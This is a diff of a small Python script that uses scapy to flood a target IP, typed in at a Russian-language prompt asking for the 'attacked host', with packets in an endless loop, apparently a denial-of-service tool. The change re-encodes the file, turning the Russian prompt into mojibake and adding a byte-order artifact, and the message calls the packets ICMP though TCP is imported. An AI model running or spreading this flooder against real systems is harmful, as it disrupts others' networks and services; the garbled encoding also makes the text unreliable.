@@ -1,5 +1,4 @@
-# -*- coding: cp1251 -*-
-from scapy.all import IP, TCP, send, RandShort
+п»їfrom scapy.all import IP, TCP, send, RandShort
 from colorama import Fore
 
 
@@ -19,6 +18,6 @@ def flood(target):
             print(
                 f"{Fore.GREEN}[+] {Fore.YELLOW}ICMP packet send to {target[0]} {Fore.RESET}"
             )
-target_ip = str(input('IP-адрес атакуемого хоста: '))
+target_ip = str(input('IP-Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
 while(1):
     flood([target_ip,1])
